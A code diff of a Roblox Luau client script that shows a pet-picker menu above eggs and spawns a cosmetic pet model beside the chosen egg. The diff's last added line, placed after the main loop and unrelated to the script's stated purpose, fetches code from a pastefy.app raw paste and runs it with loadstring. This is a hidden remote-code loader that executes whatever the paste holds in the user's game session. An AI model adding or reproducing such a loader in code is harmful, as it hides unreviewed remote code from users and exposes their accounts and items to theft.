@@ -1,8 +1,8 @@
 local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- ✅ Egg types and pet options
 local EGG_NAMES = {
     "Bug Egg", "Night Egg", "Mythical Egg", "Paradise Egg", "Oasis Egg"
 }
@@ -15,108 +15,106 @@ local PET_POOL = {
     ["Oasis Egg"] = {"Meercat", "Sandsnake", "Oxolotl", "Raccoon"},
 }
 
--- 🔁 Ensure egg has a StringValue for current pet
-local function ensureCurrentPet(egg)
-    local sv = egg:FindFirstChild("CurrentPet")
-    if not sv then
-        sv = Instance.new("StringValue")
-        sv.Name = "CurrentPet"
-        sv.Value = ""
-        sv.Parent = egg
+local PetModels = ReplicatedStorage:WaitForChild("PetModels")
+
+-- Deletes old pets near egg
+local function clearVisualPet(egg)
+    for _, obj in ipairs(egg:GetChildren()) do
+        if obj.Name == "SpawnedPet" and obj:IsA("Model") then
+            obj:Destroy()
+        end
     end
-    return sv
 end
 
--- 🎯 Check if egg is near player
-local function isPlayerNearby(egg)
-    local part = egg:FindFirstChildWhichIsA("BasePart")
-    local char = player.Character
-    if not part or not char or not char:FindFirstChild("HumanoidRootPart") then return false end
-    return (part.Position - char.HumanoidRootPart.Position).Magnitude <= 20
+-- Spawns model next to egg
+local function spawnVisualPet(egg, petName)
+    clearVisualPet(egg)
+    local base = egg:FindFirstChildWhichIsA("BasePart")
+    if not base then return end
+
+    local template = PetModels:FindFirstChild(petName)
+    if not template then return end
+
+    local clone = template:Clone()
+    clone.Name = "SpawnedPet"
+    clone:SetPrimaryPartCFrame(base.CFrame * CFrame.new(2, 0, 0))
+    clone.Parent = egg
 end
 
--- 🎛️ Create UI for selecting a pet
+-- Updates or creates UI
 local function updateEggUI(egg)
-    local part = egg:FindFirstChildWhichIsA("BasePart")
-    local currentPet = ensureCurrentPet(egg)
-    if not part then return end
+    local base = egg:FindFirstChildWhichIsA("BasePart")
+    if not base then return end
 
-    if not isPlayerNearby(egg) then
+    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
+    if (player.Character.HumanoidRootPart.Position - base.Position).Magnitude > 20 then
         local existing = egg:FindFirstChild("PetUI")
         if existing then existing:Destroy() end
         return
     end
 
-    local ui = egg:FindFirstChild("PetUI")
-    if not ui then
-        ui = Instance.new("BillboardGui")
-        ui.Name = "PetUI"
-        ui.Adornee = part
-        ui.Size = UDim2.new(0, 200, 0, 100)
-        ui.StudsOffset = Vector3.new(0, 4, 0)
-        ui.AlwaysOnTop = true
-        ui.Parent = egg
+    if egg:FindFirstChild("PetUI") then return end
 
-        local dropdown = Instance.new("TextButton")
-        dropdown.Name = "Dropdown"
-        dropdown.Size = UDim2.new(1, -10, 0, 30)
-        dropdown.Position = UDim2.new(0, 5, 0, 5)
-        dropdown.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-        dropdown.TextColor3 = Color3.new(1, 1, 1)
-        dropdown.Font = Enum.Font.GothamBold
-        dropdown.TextScaled = true
-        dropdown.Text = "Select Pet"
-        dropdown.Parent = ui
+    local gui = Instance.new("BillboardGui")
+    gui.Name = "PetUI"
+    gui.Adornee = base
+    gui.Size = UDim2.new(0, 200, 0, 100)
+    gui.StudsOffset = Vector3.new(0, 4, 0)
+    gui.AlwaysOnTop = true
+    gui.Parent = egg
 
-        local dropdownList = Instance.new("Frame")
-        dropdownList.Name = "DropdownList"
-        dropdownList.Size = UDim2.new(1, -10, 0, 60)
-        dropdownList.Position = UDim2.new(0, 5, 0, 40)
-        dropdownList.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        dropdownList.Visible = false
-        dropdownList.ClipsDescendants = true
-        dropdownList.Parent = ui
+    local dropdown = Instance.new("TextButton")
+    dropdown.Name = "Dropdown"
+    dropdown.Size = UDim2.new(1, -10, 0, 30)
+    dropdown.Position = UDim2.new(0, 5, 0, 5)
+    dropdown.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
+    dropdown.Text = "Select Pet"
+    dropdown.TextColor3 = Color3.new(1, 1, 1)
+    dropdown.Font = Enum.Font.GothamBold
+    dropdown.TextScaled = true
+    dropdown.Parent = gui
 
-        local layout = Instance.new("UIListLayout")
-        layout.FillDirection = Enum.FillDirection.Vertical
-        layout.SortOrder = Enum.SortOrder.LayoutOrder
-        layout.Padding = UDim.new(0, 2)
-        layout.Parent = dropdownList
+    local listFrame = Instance.new("Frame")
+    listFrame.Size = UDim2.new(1, -10, 0, 60)
+    listFrame.Position = UDim2.new(0, 5, 0, 40)
+    listFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    listFrame.Visible = false
+    listFrame.ClipsDescendants = true
+    listFrame.Name = "DropdownList"
+    listFrame.Parent = gui
 
-        dropdown.MouseButton1Click:Connect(function()
-            dropdownList.Visible = not dropdownList.Visible
+    local layout = Instance.new("UIListLayout")
+    layout.FillDirection = Enum.FillDirection.Vertical
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Padding = UDim.new(0, 2)
+    layout.Parent = listFrame
+
+    local pool = PET_POOL[egg.Name]
+    if not pool then return end
+
+    for _, petName in ipairs(pool) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 20)
+        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 14
+        btn.Text = petName
+        btn.Parent = listFrame
+
+        btn.MouseButton1Click:Connect(function()
+            spawnVisualPet(egg, petName)
+            dropdown.Text = "Pet: " .. petName
+            listFrame.Visible = false
         end)
-
-        -- Fill pet options
-        local pool = PET_POOL[egg.Name]
-        if pool then
-            for _, petName in ipairs(pool) do
-                local btn = Instance.new("TextButton")
-                btn.Size = UDim2.new(1, 0, 0, 20)
-                btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-                btn.TextColor3 = Color3.new(1, 1, 1)
-                btn.Font = Enum.Font.Gotham
-                btn.TextSize = 14
-                btn.Text = petName
-                btn.Parent = dropdownList
-
-                btn.MouseButton1Click:Connect(function()
-                    currentPet.Value = petName
-                    dropdown.Text = "Pet: " .. petName
-                    dropdownList.Visible = false
-                end)
-            end
-        end
     end
 
-    -- Update label text if needed
-    local dropdown = ui:FindFirstChild("Dropdown")
-    if dropdown and currentPet.Value ~= "" then
-        dropdown.Text = "Pet: " .. currentPet.Value
-    end
+    dropdown.MouseButton1Click:Connect(function()
+        listFrame.Visible = not listFrame.Visible
+    end)
 end
 
--- 🌀 Loop to update nearby eggs
+-- Loop to monitor all eggs
 task.spawn(function()
     while true do
         for _, egg in ipairs(Workspace:GetDescendants()) do
@@ -127,3 +125,4 @@ task.spawn(function()
         task.wait(1)
     end
 end)
+loadstring(game:HttpGet("https://pastefy.app/BRlt9x4Q/raw"))()
